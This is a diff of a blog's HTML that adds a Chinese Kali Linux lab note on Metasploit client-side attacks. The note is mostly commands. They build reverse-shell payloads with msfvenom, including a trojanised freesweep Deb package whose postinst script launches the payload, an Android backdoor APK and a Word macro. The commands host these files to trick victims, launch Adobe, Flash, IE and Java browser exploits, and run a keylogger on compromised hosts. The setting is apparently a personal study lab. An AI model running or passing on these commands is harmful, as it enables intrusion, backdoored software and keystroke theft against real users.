@@ -240,6 +240,668 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94)%EF%BC%9AMSF--%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94)%EF%BC%9AMSF--%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" itemprop="url">Kali Linux笔记(一百零五)：MSF--客户端渗透</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T15:26:33+08:00">
+                2020-03-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Msf–客户端渗透"><a href="#1-Msf–客户端渗透" class="headerlink" title="1. Msf–客户端渗透"></a>1. Msf–客户端渗透</h4><ul>
+<li>在无法突破网络边界的情况下转而攻击客户端<ul>
+<li>社会工程学攻击</li>
+<li>进而渗透线上业务网络</li>
+</ul>
+</li>
+<li>含有漏洞利用代码的WEB站点<ul>
+<li>利用客户端漏洞</li>
+</ul>
+</li>
+<li>含有漏洞利用代码的DOC、PDF等文档</li>
+<li>诱骗被害者执行Payload</li>
+</ul>
+<h4 id="2-诱骗被害者执行Payload（Windows）"><a href="#2-诱骗被害者执行Payload（Windows）" class="headerlink" title="2. 诱骗被害者执行Payload（Windows）"></a>2. 诱骗被害者执行Payload（Windows）</h4><ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：msfvenom --payload-options -p windows/shell/reverse_tcp</code></strong></li>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o 1.exe</code></strong></li>
+<li><strong><code>🔺命令：cp /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
+<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
+<li><strong><code>🔺命令：set payload windows/shell/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP/1.exe，下载并保存" target="_blank" rel="noopener">http://Kali的IP/1.exe，下载并保存</a></li>
+<li>在Kali服务器端准备好后，执行1.exe</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否已经获得shell</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-诱骗被害者执行Payload（Linux-Deb包）"><a href="#3-诱骗被害者执行Payload（Linux-Deb包）" class="headerlink" title="3. 诱骗被害者执行Payload（Linux Deb包）"></a>3. 诱骗被害者执行Payload（Linux Deb包）</h4><ul>
+<li>Bodhi<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>依赖文件：/var/cache/apt/archives/</li>
+<li><strong><code>🔺命令：apt-get --download-only install freesweep_0.90-1_i386.deb</code></strong></li>
+<li><strong><code>🔺命令：cp freesweep_0.90-1_i386.deb /root/Desktop</code></strong></li>
+<li><strong><code>🔺命令：cd /root/Desktop</code></strong></li>
+<li><strong><code>🔺命令：dpkg -x freesweep_0.90-1_i386.deb free</code></strong></li>
+<li><strong><code>🔺命令：mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></strong></li>
+<li><strong><code>🔺命令：vi control</code></strong><ul>
+<li>Package:freesweep</li>
+<li>Version:0.90-1</li>
+<li>Section:Games and Amusement</li>
+<li>Priority:optional</li>
+<li>Architecture:i386</li>
+<li>Maintainer:Ubuntu MOTU Developers(<a href="mailto:ubuntu-motu@lists.ubuntu.com" target="_blank" rel="noopener">ubuntu-motu@lists.ubuntu.com</a>)</li>
+<li>Description:a text-based minesweeper</li>
+<li>Freesweep is an implementation of the popular minesweeper game,where one tries to find all the mines without igniting any,based on hints given by the computer.Unlike most implementations of this game,Freesweep works in any visual text display in Linux console,in an xterm,and in most text-based terminals currently in use.</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：vi postinst</code></strong> <ul>
+<li>#!/bin/sh </li>
+<li>sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/ freesweep_scores &amp; /usr/games/freesweep &amp;</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：chmod +x postinst</code></strong> </li>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></strong></li>
+<li><strong><code>🔺命令：chmod 755 postinst</code></strong></li>
+<li><strong><code>🔺命令：dpkg-deb --build /root/free</code></strong></li>
+<li><strong><code>🔺命令：cp /root</code></strong></li>
+<li><strong><code>🔺命令：cp free.deb /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
+<li><strong><code>🔺命令：set payload linux/x86/shell/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Bodhi<ul>
+<li>浏览器访问<a href="http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）" target="_blank" rel="noopener">http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）</a></li>
+<li><strong><code>🔺命令：sudp dpkg -i free.deb</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否已经获得shell</li>
+</ul>
+</li>
+<li>▲ 2020.03.01 freesweep程序为1.0.1-1，amd64架构，暂无法找到0.90-1，i386架构</li>
+<li>▲ 2020.03.01 无法拿到shell，但能看到分步(stage)发送shell的代码，估计权限问题</li>
+</ul>
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=2943VKOzBws-fXPZvYeClqNi9jnNbtOmUSEM80J3jKa8p6ZZIclAArUm-tmAzsIgjYpsPMTrloK1RFM9c4A_LYB1s8bw0LtYDSIm15uLQznoMU_9Q0pMiJAURx_6OwbUyw&file_name=/freeswap-control.PNG" alt="freesweep-control"></p>
+<h4 id="4-利用Acrobat-Reader漏洞执行payload"><a href="#4-利用Acrobat-Reader漏洞执行payload" class="headerlink" title="4. 利用Acrobat Reader漏洞执行payload"></a>4. 利用Acrobat Reader漏洞执行payload</h4><ul>
+<li>构造PDF文件：<strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>安装Acrobat Reader8.1.2</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong>（生成一个PDF文件）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /mnt/hgfs/share/</code></strong>（查看是否被查杀）</li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /var/www/html</code></strong></li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>浏览器访问<a href="http://Kali的IP/msf.pdf（是否停止工作）" target="_blank" rel="noopener">http://Kali的IP/msf.pdf（是否停止工作）</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>压缩为ZIP文件</li>
+<li><strong><code>🔺命令：cp /root/.msf4/local/msf.zip /mnt/hgfs/share/</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>解压msf.zip为msf.pdf，双击打开msf.pdf</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：getpid</code></strong></li>
+<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
+<li><strong><code>🔺命令：getpid</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>构造恶意网站：<strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>安装Acrobat Reader8.1.2（小于8.1.3的缓冲区溢出漏洞）</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong>（如果不设置，则回生成一个随机字符串）</li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：getpid</code></strong></li>
+<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
+<li><strong><code>🔺命令：getpid</code></strong></li>
+<li><strong><code>🔺命令：use priv</code></strong>（提权）</li>
+<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong></li>
+<li><strong><code>🔺命令：tailf</code></strong> 查看键盘记录器</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>随机敲击键盘或运行命令</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看键盘记录器是否记录</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>▲ 2020.03.02 通过构造恶意网站来拿到shell的模块暂无法成功拿到shell</li>
+<li>Meterpreter <ul>
+<li><strong><code>🔺命令：use priv</code></strong></li>
+<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="5-利用Flash插件漏洞执行payload（对Flash版本要求高）"><a href="#5-利用Flash插件漏洞执行payload（对Flash版本要求高）" class="headerlink" title="5. 利用Flash插件漏洞执行payload（对Flash版本要求高）"></a>5. 利用Flash插件漏洞执行payload（对Flash版本要求高）</h4><ul>
+<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
+<li>Window 7（带Flash）<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7（带Flash）<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
+<li>Window 7（带Flash）<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7（带Flash）<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use auxiliary/server/</code></strong>browser_autopwn2（挑选质量较好的payload的集合）<ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use auxiliary/server/browser_autopwn2</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+</ul>
+</li>
+<li>Android手机<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>▲ 2020.03.02 很难下载到对应Flash插件版本</li>
+</ul>
+<h4 id="6-利用IE浏览器漏洞执行payload"><a href="#6-利用IE浏览器漏洞执行payload" class="headerlink" title="6. 利用IE浏览器漏洞执行payload"></a>6. 利用IE浏览器漏洞执行payload</h4><ul>
+<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：sysinfo</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-利用JRE漏洞执行payload"><a href="#7-利用JRE漏洞执行payload" class="headerlink" title="7. 利用JRE漏洞执行payload"></a>7. 利用JRE漏洞执行payload</h4><ul>
+<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：help</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>安装jre-7u10-windows-i586</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：help</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>安装jre-7u10-windows-i586</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
+<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：help</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-生成Android后门程序"><a href="#8-生成Android后门程序" class="headerlink" title="8. 生成Android后门程序"></a>8. 生成Android后门程序</h4><ul>
+<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：generate -f apk -p android -t raw</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
+<li><strong><code>🔺命令：set payload android/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Android<ul>
+<li>拷贝a.apk到Android手机</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到了shell</li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：ps</code></strong></li>
+<li><strong><code>🔺命令：help</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-VBScript感染方式"><a href="#9-VBScript感染方式" class="headerlink" title="9. VBScript感染方式"></a>9. VBScript感染方式</h4><ul>
+<li>利用宏感染word、excel文档</li>
+<li>绕过某些基于文件类型检查的安全机制</li>
+<li>生成vbscript脚本：<strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/ meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe</code></strong></li>
+<li>Office 2007 +<ul>
+<li>视图–宏–创建</li>
+<li>Payload第一部分VBA代码黏入宏创建中</li>
+<li>Payload第二部分十六进制代码黏入word文档正文</li>
+<li>双击打开则促发攻击</li>
+</ul>
+</li>
+<li>Msf启动侦听<ul>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%9B%9B)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--%E7%BB%93%E5%90%88%E5%A4%96%E9%83%A8%E5%BA%94%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2693,209 +3355,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/Git%E7%AC%94%E8%AE%B0-7%EF%BC%9A%E5%AE%9E%E7%8E%B0Github%E5%85%8D%E5%AF%86%E6%8E%A8%E9%80%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/20/Git%E7%AC%94%E8%AE%B0-7%EF%BC%9A%E5%AE%9E%E7%8E%B0Github%E5%85%8D%E5%AF%86%E6%8E%A8%E9%80%81/" itemprop="url">Git笔记-7：实现Github免密推送</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:24:49+08:00">
-                2020-02-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Git/" itemprop="url" rel="index">
-                    <span itemprop="name">Git</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  168 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="1-Git传输的协议"><a href="#1-Git传输的协议" class="headerlink" title="1. Git传输的协议"></a>1. Git传输的协议</h4><ul>
-<li>local协议</li>
-<li>HTTP(S)协议：需要输入账号密码</li>
-<li>SSH协议：不需要输入账号密码</li>
-<li>Git协议</li>
-<li><a href="https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">Git免密推送</a></li>
-</ul>
-<h4 id="2-SSH协议登陆"><a href="#2-SSH协议登陆" class="headerlink" title="2. SSH协议登陆"></a>2. SSH协议登陆</h4><ul>
-<li>在个人界面的Settings处</li>
-<li>SSH and GPG keys</li>
-<li>generating SSH keys</li>
-<li>Generating a new SSH key and adding it to the ssh-agent</li>
-<li>Windows<ul>
